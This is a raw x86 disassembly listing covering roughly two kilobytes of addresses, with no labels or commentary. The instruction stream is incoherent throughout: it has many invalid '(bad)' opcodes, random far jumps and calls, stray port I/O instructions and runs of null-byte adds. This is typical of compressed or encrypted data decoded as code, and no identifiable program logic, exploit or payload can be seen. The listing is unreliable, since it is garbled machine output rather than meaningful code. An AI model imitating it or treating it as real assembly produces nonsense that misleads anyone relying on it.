  435644:	push   ebx
  435645:	add    BYTE PTR [edx+0x4b],ah
  435648:	call   0x898a:0x8776e912
  43564f:	retf   
  435650:	sar    cl,0x71
  435653:	ins    DWORD PTR es:[edi],dx
  435654:	or     bh,bh
  435656:	jbe    0x435631
  435658:	adc    eax,DWORD PTR [eax]
  43565a:	jmp    0x43565f
  43565f:	add    BYTE PTR [ebx+0x79cfd072],ch
  435665:	sahf   
  435666:	xchg   edx,eax
  435667:	push   ebp
  435668:	jno    0x43566c
  43566a:	add    BYTE PTR [ebp+edi*8-0x6d],ah
  43566e:	xchg   esp,eax
  43566f:	jmp    0x6fc858ea
  435674:	add    eax,0x5fe90014
  435679:	jg     0x4356b2
  43567b:	outs   dx,DWORD PTR ds:[esi]
  43567c:	sbb    DWORD PTR ds:0xe9cde900,edx
  435682:	test   BYTE PTR [edi-0x7e387c6e],dh
  435688:	jae    0x43560f
  43568a:	inc    edx
  43568b:	mov    cl,0x77
  43568d:	jg     0x435674
  43568f:	jmp    0x4356f8
  435691:	ret    0x3f85
  435694:	aad    0x28
  435696:	add    BYTE PTR [edx],dl
  435698:	add    BYTE PTR [ecx+0x50],dl
  43569b:	aas    
  43569c:	push   ecx
  43569d:	mov    DWORD PTR [esi],ebp
  43569f:	jmp    0x5585dc1a
  4356a4:	sahf   
  4356a5:	cld    
  4356a6:	jl     0x43564d
  4356a8:	mov    DWORD PTR es:[edx+0x15],eax
  4356ac:	xor    DWORD PTR [ecx-0x79c4510c],ebp
  4356b2:	or     ch,al
  4356b4:	push   eax
  4356b5:	cs stc 
  4356b7:	das    
  4356b8:	popf   
  4356b9:	cmp    eax,0xa776f977
  4356be:	push   edx
  4356bf:	mov    ?,WORD PTR [ebx+0xffffb9]
  4356c5:	add    BYTE PTR [eax],al
  4356c7:	add    BYTE PTR [eax],al
  4356c9:	call   0x563e:0xe04ef722
  4356d0:	push   0xfffcccf5
  4356d5:	pop    ebx
  4356d6:	test   BYTE PTR [esi+0x68],dh
  4356d9:	int3   
  4356da:	push   edi
  4356db:	mov    eax,DWORD PTR ds:[edx]
  4356de:	pusha  
  4356df:	add    DWORD PTR [esi-0x7c],0x3c
  4356e3:	inc    esp
  4356e4:	add    bh,BYTE PTR [ebx]
  4356e6:	cmp    al,0x86
  4356e8:	mov    al,ds:0x8b0003c2
  4356ed:	inc    edx
  4356ee:	addr16 push cs
  4356f0:	add    BYTE PTR [esp+edx*1+0xf1566f7],bl
  4356f7:	inc    edx
  4356f8:	mov    eax,DWORD PTR [edx]
  4356fa:	arpl   WORD PTR [esi],cx
  4356fc:	add    BYTE PTR [esp+edi*1+0x3729886],cl
  435703:	add    BYTE PTR [eax-0x620549b0],cl
  435709:	lods   al,BYTE PTR ds:[esi]
  43570a:	mov    ch,0xf9
  43570c:	dec    DWORD PTR [ebx-0x6b]
  43570f:	shl    BYTE PTR [esi+0x5d],0x2f
  435713:	jle    0x4356a9
  435715:	pop    esp
  435716:	add    eax,DWORD PTR [eax]
  435718:	(bad)  
  435719:	ror    BYTE PTR [eax+0x34c0094],1
  43571f:	cmp    DWORD PTR [esi-0x4c],0x976c3e39
  435726:	jle    0x4357a3
  435728:	clc    
  435729:	push   cs
  43572a:	push   ecx
  43572b:	std    
  43572c:	mov    eax,0x0
  435731:	add    BYTE PTR [esi],cl
  435733:	add    eax,DWORD PTR [eax]
  435735:	add    BYTE PTR [edi-0x6afbf3b1],bl
  43573b:	inc    eax
  43573c:	mov    ah,0x16
  43573e:	or     al,0x3
  435740:	ins    DWORD PTR es:[edi],dx
  435741:	cmp    eax,0x855bf887
  435746:	jne    0x4357c3
  435748:	dec    esp
  435749:	add    esi,edi
  43574b:	push   ds
  43574c:	or     al,0xfd
  43574e:	lods   al,BYTE PTR ds:[esi]
  43574f:	xchg   ebx,eax
  435750:	(bad)  
  435751:	sub    al,0xac
  435753:	sbb    edx,DWORD PTR [edi]
  435755:	mov    esi,0xe8321a25
  43575a:	lods   al,BYTE PTR ds:[esi]
  43575b:	jns    0x43575a
  43575d:	(bad)  
  43575e:	out    dx,al
  43575f:	jbe    0x4357ba
  435761:	test   DWORD PTR [ebx+0x2c],edi
  435764:	enter  0xfc10,0x66
  435768:	sub    eax,ebp
  43576a:	ins    BYTE PTR es:[edi],dx
  43576b:	push   ebp
  43576c:	retf   
  43576d:	stc    
  43576e:	out    dx,al
  43576f:	ficom  WORD PTR [eax]
  435771:	rcr    BYTE PTR [ebx+ebp*2-0x13],0x58
  435776:	sbb    BYTE PTR [esi-0x3c],0x5a
  43577a:	cs sub al,0xc4
  43577d:	(bad)  
  43577e:	and    esp,ebp
  435780:	jle    0x43573c
  435782:	aad    0xb6
  435784:	std    
  435785:	push   DWORD PTR [ebp-0x61]
  435788:	add    eax,0x826fc385
  43578d:	into   
  43578e:	(bad)  [eax+edi*2-0x485762b6]
  435795:	in     eax,0x0
  435797:	add    BYTE PTR [eax],al
  435799:	add    BYTE PTR [eax],al
  43579b:	ja     0x435815
  43579d:	mov    dh,0x66
  43579f:	jne    0x435761
  4357a1:	mov    edi,0xdbfda450
  4357a6:	mov    es,WORD PTR [ebx+ebp*4+0x47bb84fd]
  4357ad:	ja     0x4357e9
  4357af:	mul    BYTE PTR [edi-0x13]
  4357b2:	xchg   BYTE PTR [ebx+0x26eedbe7],bh
  4357b8:	jge    0x435786
  4357ba:	test   DWORD PTR [ebx+0x75104628],eax
  4357c0:	fadd   QWORD PTR [ecx-0x5dfcfc99]
  4357c6:	int3   
  4357c7:	pushf  
  4357c8:	pop    esp
  4357c9:	outs   dx,BYTE PTR ds:[esi]
  4357ca:	ror    BYTE PTR [eax+0x5f],0xa6
  4357ce:	mov    edi,0xbf9bceb9
  4357d3:	mov    cl,0xce
  4357d5:	mov    bl,0xbf
  4357d7:	test   eax,0xc1bfabce
  4357dc:	into   
  4357dd:	sbb    al,0x79
  4357df:	(bad)  [ecx-0xedb03e4]
  4357e5:	pop    eax
  4357e6:	or     BYTE PTR [edi+0x7278c536],ch
  4357ec:	push   ds
  4357ed:	push   cs
  4357ee:	(bad)  
  4357ef:	and    DWORD PTR [ecx+0x60],ebx
  4357f2:	push   ebx
  4357f3:	or     DWORD PTR [ebx+0x33f3f7b8],0x1a227aef
  4357fd:	pop    esi
  4357fe:	xor    eax,DWORD PTR [eax]
  435800:	add    BYTE PTR [eax],al
  435802:	add    BYTE PTR [eax],al
  435804:	jge    0x4357ff
  435806:	adc    BYTE PTR [edi+0x77],dl
  435809:	add    DWORD PTR ds:0xd753f202,0xebf1fd7e
  435813:	add    esi,DWORD PTR [ebp-0x75]
  435816:	xlat   BYTE PTR ds:[ebx]
  435817:	jp     0x4357fe
  435819:	push   es
  43581a:	jo     0x43586f
  43581c:	imul   ecx,DWORD PTR [ebx+0x31fa2377],0xfec57aaf
  435826:	and    DWORD PTR [ebx+0x69],eax
  435829:	add    ah,BYTE PTR [edi+0x4]
  43582c:	jne    0x4357b9
  43582e:	das    
  43582f:	pop    eax
  435830:	cli    
  435831:	dec    ecx
  435832:	aaa    
  435833:	jge    0x4357f2
  435835:	dec    esi
  435836:	mov    ds:0xe7193584,al
  43583b:	add    ebx,DWORD PTR [edx]
  43583d:	mov    ebp,0x823403e7
  435842:	add    BYTE PTR [ebp-0x510642e6],ch
  435848:	cs mov ebx,0x5836daf9
  43584e:	pop    ebx
  43584f:	stos   DWORD PTR es:[edi],eax
  435850:	jne    0x435854
  435852:	mov    eax,0xf9babe97
  435857:	das    
  435858:	mov    WORD PTR [esp+eax*1-0x17],?
  43585c:	and    cl,dh
  43585e:	int3   
  43585f:	lods   eax,DWORD PTR ds:[esi]
  435860:	or     eax,0x4a1cccce
  435865:	scas   al,BYTE PTR es:[edi]
  435866:	test   DWORD PTR [eax+eax*1],ebx
  435869:	add    BYTE PTR [eax],al
  43586b:	add    BYTE PTR [eax],al
  43586d:	shr    ebp,0xcd
  435870:	and    bh,bl
  435872:	xor    eax,0x1e387216
  435877:	xor    eax,0x4f0f452b
  43587c:	pusha  
  43587d:	imul   ebp,edx,0x85829986
  435883:	push   eax
  435884:	stc    
  435885:	scas   al,BYTE PTR es:[edi]
  435886:	push   edi
  435887:	stc    
  435888:	ss mov esi,0x76e5be58
  43588e:	jp     0x43588a
  435890:	es scas al,BYTE PTR es:[edi]
  435892:	mov    edx,0x2752b5b
  435897:	int3   
  435898:	mov    esp,0x9c85aeeb
  43589d:	pop    esi
  43589e:	push   ebx
  43589f:	xor    DWORD PTR [eax],0xffffffc5
  4358a2:	test   DWORD PTR ss:[eax+0x7df9815a],eax
  4358a9:	lods   eax,DWORD PTR ds:[esi]
  4358aa:	dec    ebp
  4358ab:	push   edx
  4358ac:	bound  esp,QWORD PTR [esi+ecx*1+0xa9df83]
  4358b3:	sub    eax,0xe5d947c2
  4358b8:	out    0xab,eax
  4358ba:	fdivr  DWORD PTR [edi+0x7cff22d2]
  4358c0:	add    BYTE PTR [edx],dh
  4358c2:	adc    BYTE PTR [ebp+0x3],dh
  4358c5:	lahf   
  4358c6:	mov    eax,ds:0x4bca8507
  4358cb:	push   cs
  4358cc:	adc    edx,0xffffffb7
  4358cf:	jne    0x4358d6
  4358d1:	add    BYTE PTR [eax],al
  4358d3:	add    BYTE PTR [eax],al
  4358d5:	add    BYTE PTR [edi-0x1f81f837],cl
  4358db:	jmp    0xc9461132
  4358e0:	idiv   edi
  4358e2:	xchg   ebx,eax
  4358e3:	jmp    0x3d0f61a1
  4358e8:	aas    
  4358e9:	xor    al,0x59
  4358eb:	mov    edi,0x51051c74
  4358f0:	and    al,0x74
  4358f2:	stos   DWORD PTR es:[edi],eax
  4358f3:	out    dx,eax
  4358f4:	add    BYTE PTR [ecx+0x64],0x3b
  4358f8:	inc    ecx
  4358f9:	and    al,0xec
  4358fb:	enter  0x8bc9,0xd1
  4358ff:	mov    bh,0x7c
  435901:	les    edx,FWORD PTR [eax+eax*8-0x73cbc1]
  435908:	(bad)  
  435909:	(bad)  
  43590a:	in     eax,dx
  43590b:	ds push edi
  43590d:	or     BYTE PTR ds:0xe4e82450,dl
  435913:	enter  0xfff7,0xb2
  435917:	in     al,dx
  435918:	push   esi
  435919:	pop    ebp
  43591a:	sahf   
  43591b:	mov    bh,0xf9
  43591d:	mov    bh,0x82
  43591f:	enter  0xfff7,0x13
  435923:	jmp    0xcccc:0x734c08b9
  43592a:	mov    al,ds:0xe9cccc73
  43592f:	cmp    ebp,esp
  435931:	mov    ebx,DWORD PTR [ecx]
  435933:	scas   eax,DWORD PTR es:[edi]
  435934:	dec    esp
  435935:	xor    esi,DWORD PTR [edi]
  435937:	or     eax,0xfbb
  43593c:	add    BYTE PTR [eax],al
  43593e:	add    BYTE PTR [eax+0x75000084],bl
  435944:	test   eax,0x4ba81805
  435949:	cmp    DWORD PTR [ebx-0x7f],0x1
  43594d:	dec    ecx
  43594e:	js     0x4358fb
  435950:	xor    BYTE PTR [ecx+0x8],cl
  435953:	dec    esi
  435954:	js     0x4359a6
  435956:	or     esi,ebp
  435958:	loop   0x43597d
  43595a:	xchg   DWORD PTR [ebx+0x69bd0b01],ebx
  435960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435961:	push   es
  435962:	pop    edx
  435963:	xchg   ecx,eax
  435964:	push   ds
  435965:	sti    
  435966:	pop    ecx
  435967:	sbb    eax,0xdaf9c78b
  43596c:	fbld   TBYTE PTR [eax]
  43596e:	mov    esi,0x4a7ca965
  435973:	popf   
  435974:	sbb    al,0x5c
  435976:	int3   
  435977:	pop    esi
  435978:	test   eax,0x7a7465fd
  43597d:	enter  0xfed0,0x20
  435981:	add    esp,0x79
  435984:	adc    bl,cl
  435986:	jae    0x4359f9
  435988:	ins    BYTE PTR es:[edi],dx
  435989:	daa    
  43598a:	mov    eax,0xf9c74399
  43598f:	cs sahf 
  435991:	ret    
  435992:	adc    BYTE PTR [ebp+0x20],dh
  435995:	sub    DWORD PTR [edi+eiz*1],ecx
  435998:	and    al,BYTE PTR [esi+0x1c]
  43599b:	and    esi,DWORD PTR [edx]
  43599d:	daa    
  43599e:	xor    al,0x5d
  4359a0:	lods   al,BYTE PTR ds:[esi]
  4359a1:	enter  0xf9,0x0
  4359a5:	add    BYTE PTR [eax],al
  4359a7:	add    BYTE PTR [edx+0x25],ch
  4359aa:	lods   al,BYTE PTR ds:[esi]
  4359ab:	cmp    DWORD PTR [esi],0xffffff90
  4359ae:	jmp    0x7d170d37
  4359b3:	dec    edx
  4359b4:	cdq    
  4359b5:	nop
  4359b6:	sub    eax,0xc02d24f9
  4359bb:	or     BYTE PTR [edx],bh
  4359bd:	(bad)  {k2}
  4359c2:	out    0x3,eax
  4359c4:	int3   
  4359c5:	pop    eax
  4359c6:	outs   dx,BYTE PTR ds:[esi]
  4359c7:	(bad)  
  4359c8:	rcl    BYTE PTR [edi-0x5b],0xf3
  4359cc:	and    dh,BYTE PTR [edx-0x33]
  4359cf:	enter  0xba1c,0x1e
  4359d3:	daa    
  4359d4:	rcl    DWORD PTR [edx],cl
  4359d6:	out    0xb7,eax
  4359d8:	cmp    edi,eax
  4359da:	stos   BYTE PTR es:[edi],al
  4359db:	inc    ebx
  4359dc:	mov    cl,0xb2
  4359de:	rol    BYTE PTR [ebx+0x75],1
  4359e1:	shl    DWORD PTR [edi],0x30
  4359e4:	jp     0x4359e8
  4359e6:	out    0x3,eax
  4359e8:	mov    ah,0x42
  4359ea:	aaa    
  4359eb:	aam    0x82
  4359ed:	inc    edx
  4359ee:	out    0xc0,eax
  4359f0:	xor    eax,0x7503ec5a
  4359f5:	add    ah,BYTE PTR [esi+0x1cc6b9b7]
  4359fb:	jge    0x4359ce
  4359fd:	push   ebx
  4359fe:	adc    DWORD PTR [ebp+0x48],edi
  435a01:	push   ss
  435a02:	dec    cx
  435a04:	imul   eax,DWORD PTR [edx],0x2fad7cb2
  435a0a:	(bad)  
  435a0b:	jl     0x435a0d
  435a0d:	add    BYTE PTR [eax],al
  435a0f:	add    BYTE PTR [eax],al
  435a11:	das    
  435a12:	ficomp WORD PTR [ebp+0x34]
  435a15:	push   ebp
  435a16:	jp     0x435a00
  435a18:	add    esi,DWORD PTR [ebp+0x2]
  435a1b:	push   ss
  435a1c:	jecxz  0x435a0e
  435a1e:	dec    ebp
  435a1f:	call   FWORD PTR [ebp-0x7e]
  435a22:	dec    ecx
  435a23:	cwde   
  435a24:	enter  0x85ab,0x2b
  435a28:	idiv   ebx
  435a2a:	aas    
  435a2b:	sar    DWORD PTR [esi+0x35],cl
  435a2e:	das    
  435a2f:	fisubr WORD PTR [eax]
  435a31:	sbb    eax,0x7503e703
  435a36:	pop    eax
  435a37:	outs   dx,BYTE PTR ds:[esi]
  435a38:	fisubr WORD PTR [esi-0x7d3c493b]
  435a3e:	inc    eax
  435a3f:	add    cl,al
  435a41:	mov    bl,0x7
  435a43:	test   DWORD PTR [edi-0x17008fa6],ebx
  435a49:	jbe    0x435a4d
  435a4b:	int    0xcb
  435a4d:	test   al,0x44
  435a4f:	xor    BYTE PTR [eax+0x63],ah
  435a52:	out    0x86,al
  435a54:	aaa    
  435a55:	jns    0x435a36
  435a57:	je     0x435a32
  435a59:	pop    DWORD PTR [eax+ebp*1+0x2]
  435a5d:	cmp    DWORD PTR [eax],ebp
  435a5f:	sub    BYTE PTR [edx+0x3e],ah
  435a62:	push   es
  435a63:	test   DWORD PTR [edi],edx
  435a65:	gs push edx
  435a67:	and    eax,0xe848a8b1
  435a6c:	or     DWORD PTR [esi-0x5c9dfffe],eax
  435a72:	jmp    0x0:0xa57c
  435a79:	add    ch,bl
  435a7b:	jg     0x435abf
  435a7d:	aad    0x9b
  435a7f:	ret    
  435a80:	inc    edx
  435a81:	mov    ecx,0xe9000276
  435a86:	addr16 ret 0x625a
  435a8a:	aam    0x5c
  435a8c:	mov    ebp,0x86f27312
  435a91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435a92:	mov    dl,0xee
  435a94:	rcr    bh,0x75
  435a97:	cmp    DWORD PTR [ebx+0x4d],0xb285c31e
  435a9e:	mov    bh,BYTE PTR [ebp+0x52]
  435aa1:	cmc    
  435aa2:	ja     0x435af8
  435aa4:	xor    BYTE PTR [ecx-0x64b034a1],bl
  435aaa:	sahf   
  435aab:	jecxz  0x435ad9
  435aad:	jmp    0x1d8ed828
  435ab2:	idiv   BYTE PTR [esi+0x2f31c20c]
  435ab8:	and    al,0x62
  435aba:	mov    dh,0x6
  435abc:	test   DWORD PTR [eax],eax
  435abe:	or     cl,BYTE PTR [eax]
  435ac0:	dec    edi
  435ac1:	sub    edx,DWORD PTR [ebx+0x58e848ee]
  435ac7:	adc    eax,0xe8d70000
  435acc:	daa    
  435acd:	and    eax,0xffffffaf
  435ad0:	cmp    BYTE PTR [esi-0x74],0xdf
  435ad4:	adc    BYTE PTR [esi+0x78],0x13
  435ad8:	rcr    BYTE PTR [esi-0x69],0xa2
  435adc:	push   ebp
  435add:	ret    
  435ade:	add    BYTE PTR [eax],al
  435ae0:	add    BYTE PTR [eax],al
  435ae2:	add    BYTE PTR [edi+0x5a0127f5],al
  435ae8:	push   cs
  435ae9:	xor    DWORD PTR [esi-0x4],eax
  435aec:	push   edx
  435aed:	inc    esi
  435aef:	push   edx
  435af0:	push   cs
  435af1:	add    BYTE PTR [eax],al
  435af3:	fadd   QWORD PTR [ebx]
  435af5:	adc    DWORD PTR [esi-0x48],0xc
  435af9:	shl    BYTE PTR [ebx-0x2f],1
  435afc:	add    al,0xc9
  435afe:	mov    DWORD PTR [edx+0x1c33571a],esp
  435b04:	fiadd  WORD PTR [edx-0x333c961b]
  435b0a:	int3   
  435b0b:	popa   
  435b0c:	cmp    ebp,esp
  435b0e:	mov    edx,DWORD PTR [ecx-0x7313834a]
  435b14:	out    0x7c,eax
  435b16:	rcr    BYTE PTR [ebx-0x73ec49c9],0x3
  435b1d:	cmp    DWORD PTR [eax-0x78],0xffffff82
  435b21:	test   DWORD PTR [edi],0xb9420
  435b27:	pushf  
  435b28:	test   BYTE PTR [eax+0xc],bh
  435b2b:	mov    WORD PTR [eax+0x39fa97d],?
  435b31:	add    BYTE PTR [ebx+0xa6d0354],al
  435b37:	fisttp WORD PTR [ebx+0x4]
  435b3a:	add    BYTE PTR [ebp-0x60],dh
  435b3d:	adc    BYTE PTR [esi+0x7cfda986],0x92
  435b44:	mov    ah,0x50
  435b46:	add    al,BYTE PTR [eax]
  435b48:	add    BYTE PTR [eax],al
  435b4a:	add    BYTE PTR [eax],al
  435b4c:	xor    ah,BYTE PTR [eax-0x56bd000f]
  435b52:	jbe    0x435b9c
  435b54:	imul   esp,DWORD PTR [ebp*8+0x77d1c086],0x44348548
  435b5f:	add    al,0xc6
  435b61:	and    al,0x23
  435b63:	cmp    ah,ch
  435b65:	ffree  st(7)
  435b67:	xchg   DWORD PTR [eax-0x5cfe8867],edi
  435b6d:	xor    al,0x4b
  435b6f:	cmp    al,0xec
  435b71:	fst    st(3)
  435b73:	xchg   DWORD PTR [eax-0x2ab48a8f],esp
  435b79:	addr16 cmp eax,ebx
  435b7c:	jne    0x435b27
  435b7e:	std    
  435b7f:	push   esi
  435b81:	nop
  435b82:	loop   0x435b8c
  435b84:	repnz mov ch,ch
  435b87:	call   edx
  435b89:	jg     0x435bab
  435b8b:	sbb    DWORD PTR [ecx],0xffffffc3
  435b8e:	inc    eax
  435b8f:	add    dh,ch
  435b91:	out    0xfb,eax
  435b93:	xor    BYTE PTR [ebp+0x7ac0f8ad],0xad
  435b9a:	std    
  435b9b:	push   DWORD PTR [ebp+0x52]
  435b9e:	mov    BYTE PTR [edi],cl
  435ba0:	jne    0x435b4b
  435ba2:	cmp    dl,0x85
  435ba5:	fcomp  QWORD PTR [edi]
  435ba7:	jge    0x435bb9
  435ba9:	cmp    eax,0xb3f10904
  435bae:	out    dx,eax
  435baf:	inc    DWORD PTR [eax]
  435bb1:	add    BYTE PTR [eax],al
  435bb3:	add    BYTE PTR [eax],al
  435bb5:	sbb    BYTE PTR [edi-0x6a840175],0xc1
  435bbc:	test   DWORD PTR [ebx+0x3],eax
  435bbf:	ss in  al,0xab
  435bc2:	and    DWORD PTR [ecx],0xf4ffbfc
  435bc8:	add    DWORD PTR ds:0xe0f40982,edi
  435bce:	aam    0xf9
  435bd0:	cmp    al,0x7d
  435bd2:	add    BYTE PTR [ebx+0x5],dh
  435bd5:	ret    0xd2b9
  435bd8:	js     0x435c4f
  435bda:	add    dh,BYTE PTR [ebp+ecx*1-0x65]
  435bde:	add    cl,BYTE PTR [ebp+0x4]
  435be1:	xchg   ebx,eax
  435be2:	add    cl,bh
  435be4:	test   BYTE PTR fs:[edx],al
  435be7:	out    0x7a,eax
  435be9:	mov    ah,0x1a
  435beb:	cmp    eax,0xd347fe02
  435bf0:	pop    ebp
  435bf1:	repnz push edi
  435bf3:	retf   
  435bf4:	js     0x435b9a
  435bf6:	sbb    bl,BYTE PTR [eax]
  435bf8:	xor    cl,BYTE PTR ds:0x7503d28c
  435bfe:	mov    DWORD PTR [esp+ecx*8],edi
  435c01:	cwde   
  435c02:	fnstenv [eax+0x3c]
  435c05:	jge    0x435bf8
  435c07:	cwde   
  435c08:	mov    esp,0x3e70374
  435c0d:	jne    0x435bba
  435c0f:	sbb    bl,dh
  435c11:	retf   0x6eb5
  435c14:	cmp    al,0x95
  435c16:	mov    ebp,0xf42a
  435c1b:	add    BYTE PTR [eax],al
  435c1d:	add    BYTE PTR [edx-0x9fc184b],bh
  435c23:	ret    0xfcdb
  435c26:	mov    ch,0x42
  435c28:	pop    ss
  435c29:	lds    ebx,FWORD PTR [ebp+esi*4+0xa34cd52]
  435c30:	call   0xe7d75329
  435c35:	add    esi,DWORD PTR [ebp+0x5]
  435c38:	jno    0x435bfa
  435c3a:	ret    0xa2
  435c3d:	loope  0x435c3c
  435c3f:	mov    esi,0xb66e40bf
  435c44:	rcr    dl,0x24
  435c47:	ins    DWORD PTR es:[edi],dx
  435c48:	sbb    ecx,ebp
  435c4a:	jbe    0x435c4e
  435c4c:	icebp  
  435c4d:	sbb    bl,bl
  435c4f:	les    esi,FWORD PTR [ebx-0x6a]
  435c52:	int    0xc7
  435c54:	or     BYTE PTR [ebx],0x41
  435c57:	xor    eax,0x4b2f1f6
  435c5c:	test   DWORD PTR [esi+edi*1-0x110eac82],ebp
  435c63:	inc    ecx
  435c64:	sbb    BYTE PTR [ecx-0x2fffbd9e],cl
  435c6a:	fist   WORD PTR [ecx]
  435c6c:	add    cl,ch
  435c6e:	jmp    0x435cb2
  435c70:	and    al,0xa8
  435c72:	loop   0x435c71
  435c74:	test   BYTE PTR [edx+0x6a09d4f2],dh
  435c7a:	(bad)  
  435c7b:	std    
  435c7c:	jl     0x435c26
  435c7e:	imul   eax,DWORD PTR [ecx+0x34c0],0xf3000000
  435c88:	jnp    0x435cd3
  435c8a:	int    0x68
  435c8c:	mov    ch,0xf9
  435c8e:	jmp    0xba437909
  435c93:	adc    ebx,DWORD PTR [eax+eax*1]
  435c96:	add    edi,DWORD PTR [ecx+0x7d]
  435c99:	push   ecx
  435c9a:	fstp   QWORD PTR [esi]
  435c9c:	aam    0x2a
  435c9e:	jmp    0xe18edc19
  435ca3:	jmp    0x435cf5
  435ca5:	clc    
  435ca6:	test   al,0xe2
  435ca8:	or     ecx,esi
  435caa:	cmp    dh,dl
  435cac:	(bad)  
  435cad:	(bad)  
  435cae:	imul   esi,DWORD PTR [edx+0x7eae86fc],0x193f7d
  435cb8:	sbb    ebp,DWORD PTR ds:0xefad5700
  435cbe:	jmp    0x436ab4
  435cc3:	xchg   eax,ecx
  435cc5:	outs   dx,BYTE PTR ds:[esi]
  435cc6:	vmulsd xmm7,xmm5,xmm0
  435cca:	jmp    0x436bbc
  435ccf:	out    0x59,eax
  435cd1:	or     bh,al
  435cd3:	push   cs
  435cd4:	sbb    BYTE PTR [eax-0x7cffe38d],ah
  435cda:	push   ebp
  435cdb:	je     0x435d42
  435cdd:	adc    DWORD PTR [eax],0xfe7b004c
  435ce3:	sbb    al,0xed
  435ce5:	sbb    DWORD PTR [ebx+0xf0073a1],eax
  435ceb:	add    BYTE PTR [eax],al
  435ced:	add    BYTE PTR [eax],al
  435cef:	add    BYTE PTR [eax+0xc0010a1],bl
  435cf5:	adc    DWORD PTR [esi-0x3acbcfe],ebp
  435cfb:	mov    esi,edx
  435cfd:	int3   
  435cfe:	loopne 0x435d42
  435d00:	lahf   
  435d01:	leave  
  435d02:	or     BYTE PTR [ecx-0x28048997],cl
  435d08:	pop    ecx
  435d0a:	adc    BYTE PTR [edx+0x2],dh
  435d0d:	xchg   DWORD PTR [edi+0x10],edx
  435d10:	pop    esp
  435d11:	je     0x435d1b
  435d13:	mulps  xmm0,XMMWORD PTR [ebx+0x10]
  435d17:	add    ah,cl
  435d19:	js     0x435cd6
  435d1b:	add    ah,bh
  435d1d:	(bad)  
  435d1e:	push   DWORD PTR [ebx-0x3d]
  435d21:	test   BYTE PTR ds:0x18401b08,bh
  435d27:	mov    al,ds:0xe9003fbf
  435d2c:	jecxz  0x435d3d
  435d2e:	add    BYTE PTR [eax],al
  435d30:	daa    
  435d31:	dec    eax
  435d32:	and    BYTE PTR [ebp-0x74fe14b4],al
  435d38:	jne    0x435d1a
  435d3a:	ret    
  435d3b:	out    0x7d,eax
  435d3d:	sub    BYTE PTR [edi+edi*8+0x41b6b1fd],ah
  435d44:	gs test eax,0x75750003
  435d4a:	pop    ds
  435d4b:	mov    al,dl
  435d4d:	cmc    
  435d4e:	ret    
  435d4f:	in     eax,0x7d
  435d51:	pop    DWORD PTR [ebx]
  435d53:	mov    eax,DWORD PTR [eax]
  435d55:	add    BYTE PTR [eax],al
  435d57:	add    BYTE PTR [eax],al
  435d59:	enter  0x8505,0x5b
  435d5d:	dec    eax
  435d5e:	and    BYTE PTR [esi+0x18],al
  435d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d62:	jns    0x435d09
  435d64:	xor    ah,BYTE PTR [ebx-0x57]
  435d67:	std    
  435d68:	test   BYTE PTR [eax+0x5d418c01],ch
  435d6e:	js     0x435d4a
  435d70:	sub    eax,0xfe05dc2b
  435d75:	sub    ch,BYTE PTR [ecx+0x2878e4fd]
  435d7b:	mov    esi,0x8307a620
  435d80:	jnp    0x435d93
  435d82:	test   eax,0xd9a58410
  435d87:	std    
  435d88:	push   DWORD PTR [edx+0x2b]
  435d8b:	add    bh,cl
  435d8d:	test   al,0x6d
  435d8f:	mov    ecx,edx
  435d91:	(bad)  
  435d92:	enter  0x7d42,0xb3
  435d96:	mov    al,0x86
  435d98:	push   ebx
  435d99:	frstor [edi-0x3724822b]
  435d9f:	xor    ebx,edx
  435da1:	(bad)  
  435da2:	fninit 
  435da4:	xor    BYTE PTR [ebp+0x1d8704b4],0x9d
  435dab:	mov    eax,0x3a96541
  435db0:	add    BYTE PTR [ebp-0x53],dh
  435db3:	out    dx,eax
  435db4:	xchg   DWORD PTR [eax+0x2],ecx
  435db7:	push   ebx
  435db8:	lea    edi,[eax+0xc33686]
  435dbe:	add    BYTE PTR [eax],al
  435dc0:	add    BYTE PTR [eax],al
  435dc2:	xchg   edx,eax
  435dc3:	or     DWORD PTR [eax],ebp
  435dc5:	scas   al,BYTE PTR es:[edi]
  435dc6:	sar    DWORD PTR gs:[esi],0x1c
  435dca:	adc    edi,esi
  435dcc:	jae    0x435e15
  435dce:	xchg   ecx,eax
  435dcf:	mov    DWORD PTR [esi+ebp*4-0x73beb313],ebp
  435dd6:	into   
  435dd7:	mov    eax,ds:0x528d515e
  435ddc:	mov    eax,0xe71823ab
  435de1:	add    esi,eax
  435de3:	push   edi
  435de4:	jnp    0xdd19689e
  435dea:	cwde   
  435deb:	mov    eax,0xb240092a
  435df0:	out    0x3,eax
  435df2:	push   eax
  435df3:	or     BYTE PTR [esi-0x3e],ah
  435df6:	test   DWORD PTR ds:0xaeae84c5,esi
  435dfc:	out    0x10,eax
  435dfe:	stc    
  435dff:	into   
  435e00:	jmp    0xc05:0x99017503
  435e07:	inc    eax
  435e08:	retf   
  435e09:	mov    WORD PTR [edi],?
  435e0b:	(bad)  
  435e0c:	mov    DWORD PTR [ebp-0x80],0xa68aefc8
  435e13:	stos   BYTE PTR es:[edi],al
  435e14:	out    0xdb,al
  435e16:	jo     0x435dc8
  435e18:	xlat   BYTE PTR ds:[ebx]
  435e19:	xor    eax,0xe42a7dcf
  435e1e:	test   edx,0xbdf01a13
  435e24:	push   0xa2
  435e29:	add    BYTE PTR [eax],al
  435e2b:	int3   
  435e2c:	add    ah,bh
  435e2e:	add    esi,edx
  435e30:	cmp    ch,bh
  435e32:	mov    WORD PTR [edx+eiz*8],gs
  435e35:	ins    DWORD PTR es:[edi],dx
  435e36:	(bad)  
  435e37:	cli    
  435e38:	call   0x760b:0xf1ffe100
  435e3f:	cmp    eax,0x76eb0012
  435e44:	add    dh,BYTE PTR [edi+edi*8-0x12]
  435e48:	dec    ebp
  435e49:	in     al,dx
  435e4a:	sub    cl,ah
  435e4c:	cli    
  435e4d:	gs jmp 0x435e4b
  435e50:	push   ebp
  435e51:	in     al,dx
  435e52:	jno    0x435e77
  435e54:	popf   
  435e55:	test   DWORD PTR [esi+0x4150405e],esp
  435e5b:	rcl    DWORD PTR ds:0x54f9e900,0xf8
  435e62:	jo     0x435e11
  435e64:	or     ch,BYTE PTR ds:0xc1b36142
  435e6a:	out    dx,al
  435e6b:	jp     0x435e6f
  435e6d:	add    cl,ch
  435e6f:	or     eax,0x7ae91043
  435e74:	add    al,BYTE PTR [eax]
  435e76:	jne    0x435e0f
  435e78:	das    
  435e79:	cli    
  435e7a:	fldcw  WORD PTR [ecx+0x10]
  435e7d:	jge    0x435eeb
